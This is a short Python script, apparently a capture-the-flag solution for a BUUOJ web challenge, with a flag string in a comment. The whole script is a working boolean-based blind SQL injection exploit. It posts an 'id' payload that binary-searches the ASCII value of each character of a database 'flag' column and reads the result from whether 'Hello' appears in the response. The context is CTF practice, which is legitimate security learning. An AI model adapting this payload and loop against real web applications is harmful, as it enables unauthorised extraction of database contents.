from time import sleep

import requests
# flag{4182dd42-5a56-4f62-ad6f-e7189af2e258}
def boolinjection(head,url,res):
    flag = 'flag:'
    for i in range(1,200):
        min = 30
        max = 127
        mid = (min + max) >> 1
        while( max > min ):
            data = {
                'id': f'0^(ascii(substring((select(flag)from(flag)),{i},1))>{mid})'
            }
            re = requests.post(url, data, head)
            if res in re.text:
                min = mid+1
            else:
                max = mid
            mid = (min + max) >> 1
        flag = flag + chr(mid)
        print(flag)
        sleep(1)
if __name__=="__main__":
    url = 'http://e8ba9073-7362-4125-9d58-ce45afa323c5.node4.buuoj.cn:81/'
    head = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0'
    }
    res = 'Hello'
    boolinjection(head, url, res)